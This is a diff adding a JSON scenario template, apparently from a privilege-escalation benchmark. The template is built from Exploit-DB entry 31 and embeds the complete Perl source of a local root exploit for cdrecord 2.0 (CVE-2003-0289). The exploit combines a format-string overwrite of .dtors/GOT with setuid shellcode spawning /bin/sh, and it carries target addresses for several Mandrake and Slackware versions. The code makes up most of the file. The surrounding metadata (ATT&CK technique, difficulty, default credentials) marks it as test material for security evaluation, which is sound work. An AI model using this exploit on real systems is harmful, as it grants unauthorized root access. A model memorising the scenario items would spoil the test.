@@ -1,0 +1,30 @@
+{
+  "template_id": "auto_edb_31",
+  "category": "A1_suid_sgid",
+  "attack_technique": "T1548.001",
+  "cwe": "CWE-250",
+  "description": "Linux privilege escalation: CDRTools CDRecord 2.0 (Mandrake / Slackware) - Local Privilege Escalation (OSVDB-6794;CVE-2003-0289)\n\nExploit source code (31.pl):\n```\n#!/usr/bin/perl\n###########################################################\n# Cdrecord version 2.0 and < local root exploit.\n#\n#\n#   [wsxz@localhost buffer]$ perl priv8cdr.pl 4\n#   Using target number 4\n#   Using Mr .dtors 0x808c82c\n#   Cdrecord 2.0 (i586-mandrake-linux-gnu)\n#\n#   scsibus: -1 target: -1 lun: -1\n#   Warning: Open by 'devname' is unintentional and not supported.\n#   /usr/bin/cdrecord: No such file or directory. Cannot open '. Cannot open SCSI driver.\n#   /usr/bin/cdrecord: For possible targets try 'cdrecord -scanbus'. Make sure you are root.\n#   /usr/bin/cdrecord: For possible transport specifiers try 'cdrecord dev=help'.\n#   sh-2.05b# id\n#   uid=0(root) gid=0(root) groups=503(wsxz)\n#   sh-2.05b#\n#####################################################\n\n\t\t    $shellcode =\n                    \"\\x31\\xc0\\x31\\xdb\\xb0\\x17\\xcd\\x80\".#setuid 0\n\t\t    \"\\x31\\xdb\\x89\\xd8\\xb0\\x2e\\xcd\\x80\".#setgid 0\n\t\t    \"\\xeb\\x1f\\x5e\\x89\\x76\\x08\\x31\\xc0\\x88\\x46\\x07\\x89\".\n                    \"\\x46\\x0c\\xb0\\x0b\\x89\\xf3\\x8d\\x4e\\x08\\x8d\\x56\\x0c\".\n                    \"\\xcd\\x80\\x31\\xdb\\x89\\xd8\\x40\\xcd\\x80\\xe8\\xdc\\xff\".\n                    \"\\xff\\xff/bin/sh\";\n\n\t\t    $cdrecordpath = \"/usr/bin/cdrecord\";\n\t\t    $nop = \"\\x90\"; # x86 NOP\n                    $offset = 0; # Default offset to try.\n\n\n     if (@ARGV == 1 || @ARGV == 2) {\n                    $target = $ARGV[0];\n                    $offset = $ARGV[1];\n\t\t    }else{\n\t\t    printf(\" Priv8security.com Cdrecord local root exploit!!\\n\");\n\t\t    printf(\" usage: $0 target\\n\");\n\t\t    printf(\" List of targets:\\n\");\n\t\t    printf(\"      1 - Linux Mandrake 8.2 Cdrecord 1.11a15\\n\");\n                    printf(\"      2 - Linux Mandrake 9.0 Cdrecord 1.11a32\\n\");\n                    printf(\"      3 - Linux Slackware 8.1 Cdrecord 1.11a24 not suid by default!!!\\n\");\n\t\t    printf(\"      4 - Linux Mandrake 9.1 Cdrecord 2.0\\n\");\n\t\t    exit(1);\n\t\t    }\n\n     if ( $target eq \"1\" ) {\n                   $retword = 0x0807af38; #Mr  .dtors ;)\n\t\t   $fmtstring = \"%.134727238x%x%x%x%x%x%x%x%x%n:\";\n\t\t    }\n     if ( $target eq \"2\" ) {\n                  # $retword = 0x08084578; #.dtors\n                   $retword = 0x08084684; #.GOT exit\n\t\t   $fmtstring = \"%.134769064x%x%x%x%x%x%x%x%x%n:\";\n\t\t    }\n      if ( $target eq \"3\" ) {\n                   $retword = 0x0807f658;\n                   $fmtstring =  \"%.134745456x%x%x%x%x%x%x%x%x%x%x%n:\";\n\t\t    }\n       if ( $target eq \"4\" ) {\n                   $retword = 0x0808c82c; #.GOT exit\n\t\t   $fmtstring = \"%.134802669x%x%x%x%x%x%x%x%x%n:\";\n\t\t    }\n\n\t\t    printf(\"Using target number %d\\n\", $target);\n                    printf(\"Using Mr .dtors 0x%x\\n\",$retword);\n\n\t\t    $new_retword = pack('l', ($retword));\n\t\t    $new_retshell = pack('l', ($retshell));\n                    $buffer2 = $new_retword;\n                    $buffer2 .= $nop x 150;\n                    $buffer2 .= $shellcode;\n                    $buffer2 .= $fmtstring;\n\n\t\t    exec(\"$cdrecordpath dev='$buffer2' '$cdrecordpath'\");\n\n\n# milw0rm.com [2003-05-14\n```",
+  "cve": "OSVDB-6794;CVE-2003-0289",
+  "exploitdb_id": "31",
+  "feasibility": "L1",
+  "docker_run_args": [],
+  "detection_difficulty": "medium",
+  "interaction_mode": "multi_step",
+  "params": {
+    "username": {
+      "type": "string",
+      "default": "lowpriv"
+    },
+    "password": {
+      "type": "string",
+      "default": "password123"
+    }
+  },
+  "instances": [
+    {
+      "scenario_id": "edb_31",
+      "type": "core",
+      "difficulty": "medium"
+    }
+  ]
+}
